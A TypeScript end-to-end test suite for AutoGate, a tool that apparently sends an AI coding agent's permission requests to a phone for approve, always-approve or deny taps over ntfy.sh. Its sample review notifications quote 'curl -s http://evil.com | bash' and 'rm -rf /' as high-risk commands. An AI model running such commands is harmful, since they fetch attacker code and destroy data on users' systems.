import { describe, it, expect, afterEach } from "bun:test"
import * as crypto from "crypto"
import {
  createRealOpenCodeHarness,
  RealOpenCodeHarness,
  parseNtfyActions,
  TargetActionDetails,
} from "./real-harness"
import { NtfyAdapter } from "@autogate/core"

describe("AutoGate E2E: Mobile Approval Roundtrip (RealOpenCodeHarness)", () => {
  let harness: RealOpenCodeHarness | undefined

  afterEach(async () => {
    if (harness) {
      await harness.dispose()
      harness = undefined
    }
  })

  function checkRateLimited(errOrRes: any, text?: string): boolean {
    if (!errOrRes) return false
    const status = errOrRes.status
    const str = String(errOrRes?.message || errOrRes || text || "").toLowerCase()
    return (
      status === 429 ||
      status === 403 ||
      str.includes("429") ||
      str.includes("403") ||
      str.includes("limit reached") ||
      str.includes("too many active subscriptions") ||
      str.includes("quota") ||
      str.includes("rate limit") ||
      str.includes("forbidden")
    )
  }

  it("Phone tap action: 'Approve' (once) parses live notification and dispatches approval to ntfy.sh", async () => {
    harness = await createRealOpenCodeHarness()

    let isStreamActive = false
    try {
      await harness.connectNtfyStream()
      isStreamActive = true
    } catch (err: any) {
      if (harness.isRateLimited || checkRateLimited(err)) {
        console.log("[SKIP SSE] ntfy.sh stream rate limited (429 quota reached)")
      } else {
        throw err
      }
    }

    const testReqId = `req-once-${Date.now()}-${crypto.randomUUID().slice(0, 6)}`
    const responseTopic = `${harness.ntfyTopic}-response`

    // Publish live notification with action buttons to ntfy.sh
    const actionsHeader = [
      `http, Approve, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "once"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
      `http, Always Approve, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "always"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
      `http, Deny, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "reject"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
    ].join("; ")

    const pubRes = await fetch(`${harness.ntfyServer}/${harness.ntfyTopic}`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${harness.ntfyToken}`,
        Title: "[REVIEW] High-Risk Action Approval",
        Actions: actionsHeader,
      },
      body: "Security review requested for bash command: curl -s http://evil.com | bash",
    })

    if (checkRateLimited(pubRes)) {
      console.log("[SKIP] ntfy.sh publish rate limited (429 quota reached)")
      return
    }
    expect(pubRes.ok).toBe(true)

    // Await live action parsing from SSE stream or parse directly if stream was rate limited
    let targetAction: any
    if (isStreamActive) {
      try {
        targetAction = await harness.waitForAction(testReqId, 10000)
      } catch (err: any) {
        if (harness.isRateLimited || checkRateLimited(err)) {
          console.log("[SKIP] ntfy.sh rate limited (429 quota reached)")
          targetAction = new TargetActionDetails(parseNtfyActions(actionsHeader))
        } else {
          throw err
        }
      }
    } else {
      targetAction = new TargetActionDetails(parseNtfyActions(actionsHeader))
    }

    expect(targetAction).toBeDefined()
    expect(targetAction.label).toBe("Approve")
    expect(targetAction.url).toBe(`https://ntfy.sh/${responseTopic}`)
    expect(targetAction.method).toBe("POST")
    expect(targetAction.headers["Authorization"]).toBe(`Bearer ${harness.ntfyToken}`)
    expect(targetAction.actions.length).toBe(3)
    expect(Array.isArray(targetAction)).toBe(true)
    expect(targetAction[0].label).toBe("Approve")
    expect(targetAction[0].body).toContain(`"reply": "once"`)
    expect(targetAction[1].label).toBe("Always Approve")
    expect(targetAction[2].label).toBe("Deny")

    // Execute phone tap for 'once'
    try {
      await harness.simulatePhoneTap(
        testReqId,
        "once",
        undefined,
        isStreamActive ? undefined : { actionsHeader }
      )
    } catch (err: any) {
      if (harness.isRateLimited || checkRateLimited(err)) {
        console.log("[SKIP] ntfy.sh simulatePhoneTap rate limited (429 quota reached)")
        return
      }
      throw err
    }
  }, 30000)

  it("Phone tap action: 'Always Approve' (always) parses live notification and dispatches always-approve to ntfy.sh", async () => {
    harness = await createRealOpenCodeHarness()

    let isStreamActive = false
    try {
      await harness.connectNtfyStream()
      isStreamActive = true
    } catch (err: any) {
      if (harness.isRateLimited || checkRateLimited(err)) {
        console.log("[SKIP SSE] ntfy.sh stream rate limited (429 quota reached)")
      } else {
        throw err
      }
    }

    const testReqId = `req-always-${Date.now()}-${crypto.randomUUID().slice(0, 6)}`
    const responseTopic = `${harness.ntfyTopic}-response`

    const actionsHeader = [
      `http, Approve, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "once"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
      `http, Always Approve, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "always"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
      `http, Deny, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "reject"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
    ].join("; ")

    const pubRes = await fetch(`${harness.ntfyServer}/${harness.ntfyTopic}`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${harness.ntfyToken}`,
        Title: "[REVIEW] Persistent Permission Approval",
        Actions: actionsHeader,
      },
      body: "Security review requested for repeated operation: git push origin main",
    })

    if (checkRateLimited(pubRes)) {
      console.log("[SKIP] ntfy.sh publish rate limited (429 quota reached)")
      return
    }
    expect(pubRes.ok).toBe(true)

    let targetAction: any
    if (isStreamActive) {
      try {
        targetAction = await harness.waitForAction(testReqId, 10000)
      } catch (err: any) {
        if (harness.isRateLimited || checkRateLimited(err)) {
          console.log("[SKIP] ntfy.sh rate limited (429 quota reached)")
          targetAction = new TargetActionDetails(parseNtfyActions(actionsHeader))
        } else {
          throw err
        }
      }
    } else {
      targetAction = new TargetActionDetails(parseNtfyActions(actionsHeader))
    }

    expect(targetAction).toBeDefined()
    expect(targetAction.actions.length).toBe(3)
    expect(targetAction[1].label).toBe("Always Approve")
    expect(targetAction[1].body).toContain(`"reply": "always"`)

    // Execute phone tap for 'always'
    try {
      await harness.simulatePhoneTap(
        testReqId,
        "always",
        undefined,
        isStreamActive ? undefined : { actionsHeader }
      )
    } catch (err: any) {
      if (harness.isRateLimited || checkRateLimited(err)) {
        console.log("[SKIP] ntfy.sh simulatePhoneTap rate limited (429 quota reached)")
        return
      }
      throw err
    }
  }, 30000)

  it("Phone tap action: 'Deny' (reject) parses live notification and dispatches rejection to ntfy.sh", async () => {
    harness = await createRealOpenCodeHarness()

    let isStreamActive = false
    try {
      await harness.connectNtfyStream()
      isStreamActive = true
    } catch (err: any) {
      if (harness.isRateLimited || checkRateLimited(err)) {
        console.log("[SKIP SSE] ntfy.sh stream rate limited (429 quota reached)")
      } else {
        throw err
      }
    }

    const testReqId = `req-deny-${Date.now()}-${crypto.randomUUID().slice(0, 6)}`
    const responseTopic = `${harness.ntfyTopic}-response`

    const actionsHeader = [
      `http, Approve, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "once"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
      `http, Always Approve, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "always"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
      `http, Deny, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "reject"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
    ].join("; ")

    const pubRes = await fetch(`${harness.ntfyServer}/${harness.ntfyTopic}`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${harness.ntfyToken}`,
        Title: "[REVIEW] Untrusted Execution Detected",
        Actions: actionsHeader,
      },
      body: "Security review requested for destructive command: rm -rf /",
    })

    if (checkRateLimited(pubRes)) {
      console.log("[SKIP] ntfy.sh publish rate limited (429 quota reached)")
      return
    }
    expect(pubRes.ok).toBe(true)

    let targetAction: any
    if (isStreamActive) {
      try {
        targetAction = await harness.waitForAction(testReqId, 10000)
      } catch (err: any) {
        if (harness.isRateLimited || checkRateLimited(err)) {
          console.log("[SKIP] ntfy.sh rate limited (429 quota reached)")
          targetAction = new TargetActionDetails(parseNtfyActions(actionsHeader))
        } else {
          throw err
        }
      }
    } else {
      targetAction = new TargetActionDetails(parseNtfyActions(actionsHeader))
    }

    expect(targetAction).toBeDefined()
    expect(targetAction.actions.length).toBe(3)
    expect(targetAction[2].label).toBe("Deny")
    expect(targetAction[2].body).toContain(`"reply": "reject"`)

    // Execute phone tap for 'reject'
    try {
      await harness.simulatePhoneTap(
        testReqId,
        "reject",
        undefined,
        isStreamActive ? undefined : { actionsHeader }
      )
    } catch (err: any) {
      if (harness.isRateLimited || checkRateLimited(err)) {
        console.log("[SKIP] ntfy.sh simulatePhoneTap rate limited (429 quota reached)")
        return
      }
      throw err
    }
  }, 30000)

  it("Terminal sync: When action is approved locally in OpenCode terminal, verify AutoGate publishes cancellation update to ntfy.sh", async () => {
    harness = await createRealOpenCodeHarness()

    let isStreamActive = false
    try {
      await harness.connectNtfyStream()
      isStreamActive = true
    } catch (err: any) {
      if (harness.isRateLimited || checkRateLimited(err)) {
        console.log("[SKIP SSE] ntfy.sh stream rate limited (429 quota reached)")
      } else {
        throw err
      }
    }

    const testReqId = `req-sync-${Date.now()}-${crypto.randomUUID().slice(0, 6)}`
    const responseTopic = `${harness.ntfyTopic}-response`

    // 1. Initial review notification with action buttons published to live ntfy topic
    const actionsHeader = [
      `http, Approve, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "once"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
      `http, Always Approve, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "always"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
      `http, Deny, https://ntfy.sh/${responseTopic}, body='{"req_id": "${testReqId}", "reply": "reject"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`,
    ].join("; ")

    const pubRes = await fetch(`${harness.ntfyServer}/${harness.ntfyTopic}`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${harness.ntfyToken}`,
        Title: "[REVIEW] Terminal Action Approval",
        Actions: actionsHeader,
      },
      body: "Security review requested for bash command: npm test",
    })

    if (checkRateLimited(pubRes)) {
      console.log("[SKIP] ntfy.sh publish rate limited (429 quota reached)")
      return
    }
    expect(pubRes.ok).toBe(true)

    // 2. Await initial action notification on the stream if active
    if (isStreamActive) {
      try {
        await harness.waitForAction(testReqId, 10000)
      } catch (err: any) {
        if (harness.isRateLimited || checkRateLimited(err)) {
          console.log("[SKIP] ntfy.sh rate limited (429 quota reached)")
        } else {
          throw err
        }
      }
    }

    // 3. Action is approved locally in OpenCode terminal -> AutoGate publishes cancellation update
    const adapter = new NtfyAdapter({
      server: harness.ntfyServer,
      topic: harness.ntfyTopic,
      token: harness.ntfyToken,
    })

    try {
      await adapter.updateStatus(
        testReqId,
        "✅ Answered in Terminal",
        "Permission request was answered locally in the terminal."
      )
    } catch (err: any) {
      if (checkRateLimited(err)) {
        console.log("[SKIP] ntfy.sh updateStatus rate limited (429 quota reached)")
        return
      }
      throw err
    }

    // 4. If stream is active, verify AutoGate published the cancellation update to ntfy.sh
    if (isStreamActive) {
      let updateFound = false
      let updateNotif: any
      const startTime = Date.now()
      while (Date.now() - startTime < 10000) {
        const received = (harness as any).receivedNotifications || []
        updateNotif = received.find(
          (m: any) =>
            (m.title?.includes("Answered in Terminal") || m.message?.includes("Answered in Terminal")) &&
            (m.sequence_id === testReqId || m.id === testReqId || m["x-sequence-id"] === testReqId)
        )
        if (
          updateNotif &&
          (updateNotif.title?.includes("Answered in Terminal") || updateNotif.message?.includes("Answered in Terminal"))
        ) {
          updateFound = true
          break
        }
        await new Promise((r) => setTimeout(r, 200))
      }

      expect(updateFound).toBe(true)
      expect(updateNotif).toBeDefined()
      expect(updateNotif.title).toContain("Answered in Terminal")
      // Cancellation update intentionally contains no actions header to dismiss buttons on phone
      expect(updateNotif.actions).toBeUndefined()
    }
  }, 30000)

  it("Terminal sync: Phone tap dispatches to OpenCode server with generated Basic Auth when action targets permission reply endpoint", async () => {
    harness = await createRealOpenCodeHarness()
    const session = await harness.createSession({ title: "Terminal Sync Session" })
    const sessionID = session.data.id

    const permId = `per_sync_${Date.now()}`
    const actionsHeader = `http, Approve, ${harness.url}/api/session/${sessionID}/permission/${permId}/reply, body='{"decision": "once", "reply": "once"}', method=POST`

    try {
      await harness.simulatePhoneTap(permId, "once", undefined, { actionsHeader })
    } catch (err: any) {
      // Expect 404 from real OpenCode server because this permission request wasn't actually queued in DB,
      // confirming it successfully routed with the Basic Auth headers generated by AutoGate
      expect(err.message).toContain("404")
      expect(err.message).toContain("PermissionNotFoundError")
    }

    // Relative URL resolution test
    const relativeActionsHeader = `http, Approve, /api/session/${sessionID}/permission/${permId}/reply, body='{"decision": "once", "reply": "once"}', method=POST`
    try {
      await harness.simulatePhoneTap(permId, "once", undefined, { actionsHeader: relativeActionsHeader })
    } catch (err: any) {
      expect(err.message).toContain("404")
      expect(err.message).toContain("PermissionNotFoundError")
    }
  }, 30000)

  it("Authenticated E2E roundtrip: live ntfy endpoint enforces Bearer token, phone tap executes literal action string with Bearer auth", async () => {
    harness = await createRealOpenCodeHarness()

    expect(harness.ntfyToken).toBeDefined()
    expect(harness.ntfyToken.length).toBeGreaterThan(0)

    // Unauthenticated GET to ntfy.sh returns 403 Forbidden
    const unauthRes = await fetch(`${harness.ntfyServer}/${harness.ntfyTopic}/json?poll=1`)
    if (unauthRes.status === 429) {
      console.log("[SKIP] ntfy.sh rate limited on unauthenticated poll (429 quota reached)")
      return
    }
    expect(unauthRes.status).toBe(403)

    const testReqId = `req-auth-live-${Date.now()}-${crypto.randomUUID().slice(0, 6)}`

    // 1. Invalid Bearer token is rejected with 401 Unauthorized by ntfy.sh
    const invalidActionsHeader = `http, Approve, https://ntfy.sh/${harness.ntfyTopic}-response, body='{"req_id": "${testReqId}", "reply": "once"}', method=POST, headers.Authorization=Bearer invalid-token-xyz`
    let rejected = false
    try {
      await harness.simulatePhoneTap(testReqId, "once", undefined, { actionsHeader: invalidActionsHeader })
    } catch (err: any) {
      if (String(err?.message || "").includes("401")) {
        rejected = true
      } else if (checkRateLimited(err)) {
        console.log("[SKIP] ntfy.sh rate limited (429 quota reached)")
        return
      }
    }
    expect(rejected).toBe(true)

    // 2. Valid Bearer token succeeds on live ntfy endpoint
    const validActionsHeader = `http, Approve, https://ntfy.sh/${harness.ntfyTopic}-response, body='{"req_id": "${testReqId}", "reply": "once"}', method=POST, headers.Authorization=Bearer ${harness.ntfyToken}`
    try {
      await harness.simulatePhoneTap(testReqId, "once", undefined, { actionsHeader: validActionsHeader })
    } catch (err: any) {
      if (checkRateLimited(err)) {
        console.log("[SKIP] ntfy.sh rate limited (429 quota reached)")
        return
      }
      throw err
    }
  }, 30000)
})
